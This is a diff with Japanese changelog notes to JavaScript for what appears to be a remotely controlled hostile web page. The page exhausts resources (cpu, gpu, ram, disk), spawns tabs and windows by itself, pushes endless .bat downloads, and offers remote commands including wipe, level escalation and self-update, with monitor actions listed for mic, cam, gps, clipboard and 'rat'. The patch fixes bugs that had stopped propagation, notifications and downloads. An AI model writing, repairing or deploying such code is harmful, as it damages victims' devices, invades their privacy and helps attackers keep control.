@@ -13,6 +13,8 @@ v3.9:
   - ダウンロード（.bat / 〇〇の保護.txt）は L4 から、1MB以上、L7で無限
   - 監視室の「結果・操作」ボタン名に対応（sound/flash/noise/hop/disk/ram/cpu/
     gpu/opfs/cache/sw/rat/sse/usb/mic/cam/gps/clip/full/wake/batt/net）
+  - 未宣言だった firing を宣言（自動増殖/通知/DLが全滅していた）
+  - restart() が PAUSED を戻していなかったのを修正（レベル変更で沈黙していた）
 
 v3.8:
   - レベル別の自動増殖を大幅強化（タブ＋ウィンドウ両方／タップ不要）
@@ -565,6 +567,7 @@ if (Q("u") === "inj") CFG.injected = true;
 var IFR = Q("u") === "ifr";
 var WIN = Q("u") === "win";
 var FROM_OS = Q("u") === "os";
+var firing = (CFG.fire !== 0);      /* 未宣言だったので自動増殖/通知/DLが全部死んでいた */
 
 /* ---------------- モバイル判定 ----------------
    スマホは「タップの処理中」しか window.open / clients.openWindow が通らない。 */
@@ -2096,7 +2099,7 @@ function ota() {
   setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
 }
 function pauseAll() {
-  PAUSED = true;
+  PAUSED = true; firing = false;
   WORKERS.forEach(function (w) { try { w.postMessage({ k: "stop" }); } catch (e) {} });
 }
 function restart() {
@@ -2105,6 +2108,7 @@ function restart() {
   R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
   R.breeded = 0; R.breed = null; R.wskin = 0; R.wskinCtx = null;
   R.dl = {}; R.ni = {};
+  PAUSED = false; firing = (CFG.fire !== 0);
   startBurns();
 }
 function bombGate() {
@@ -2297,7 +2301,7 @@ function handleCmd(j) {
   if (j.ver && j.ver !== MYVER && !R.ota) ota();
   if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
   if (j.fire === 0 && !R.paused) { R.paused = true; pauseAll(); }
-  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
+  if (j.fire === 1 && R.paused) { R.paused = false; PAUSED = false; firing = true; startBurns(); }
   if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
   if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
 
